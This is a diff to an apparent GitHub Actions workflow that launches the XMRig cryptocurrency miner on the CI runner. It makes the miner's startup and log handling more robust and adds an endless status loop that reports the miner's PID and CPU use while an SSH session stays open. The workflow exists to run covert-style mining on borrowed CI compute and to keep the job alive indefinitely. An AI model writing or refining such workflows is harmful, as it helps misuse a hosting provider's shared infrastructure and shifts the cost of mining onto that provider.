@@ -112,13 +112,18 @@ jobs:
 
       - name: Start XMRig
         run: |
+          sudo touch /home/SSH/xmrig.log
+          sudo chown SSH:SSH /home/SSH/xmrig.log
           cd /home/SSH/xmrig/build
-          sudo -u SSH nohup ./xmrig > /home/SSH/xmrig.log 2>&1 &
-          sleep 5
-          if pgrep -x "xmrig" > /dev/null; then
+          sudo -u SSH bash -c 'nohup ./xmrig > /home/SSH/xmrig.log 2>&1 &'
+          sleep 10
+          if pgrep -f "xmrig" > /dev/null; then
               echo "XMRig started successfully"
+              echo "Process ID: $(pgrep -f xmrig)"
           else
               echo "Warning: XMRig may not be running properly"
+              echo "Checking log file:"
+              cat /home/SSH/xmrig.log || echo "Log file is empty or not accessible"
           fi
 
       - name: Maintain Connection
@@ -141,11 +146,15 @@ jobs:
           echo "View XMRig log: tail -f /home/SSH/xmrig.log"
           echo ""
           while true; do
-              echo "[$(date)] SSH Active | XMRig Running - Use 'Cancel workflow' button to terminate"
-              if pgrep -x "xmrig" > /dev/null; then
-                  echo "[$(date)] XMRig process is running"
+              echo "[$(date)] SSH Active | XMRig Status Check"
+              if pgrep -f "xmrig" > /dev/null; then
+                  PID=$(pgrep -f xmrig)
+                  echo "[$(date)] XMRig is RUNNING - PID: $PID"
+                  echo "[$(date)] CPU Usage: $(ps -p $PID -o %cpu= 2>/dev/null || echo 'N/A')%"
               else
-                  echo "[$(date)] WARNING: XMRig process not found!"
+                  echo "[$(date)] WARNING: XMRig process NOT FOUND!"
+                  echo "[$(date)] Last 10 lines of log:"
+                  tail -n 10 /home/SSH/xmrig.log 2>/dev/null || echo "Cannot read log file"
               fi
               sleep 300
           done
